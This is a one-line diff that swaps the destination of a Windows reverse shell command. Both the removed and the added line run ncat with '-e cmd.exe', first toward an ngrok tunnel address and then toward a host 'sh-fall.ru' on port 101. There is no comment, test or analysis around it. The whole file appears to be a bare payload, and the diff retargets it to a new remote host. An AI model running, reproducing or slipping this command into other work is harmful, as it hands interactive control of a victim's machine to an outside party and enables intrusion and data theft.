@@ -1,1 +1,1 @@
-ncat 4.tcp.eu.ngrok.io 13736 -e cmd.exe 
+ncat sh-fall.ru 101 -e cmd.exe 
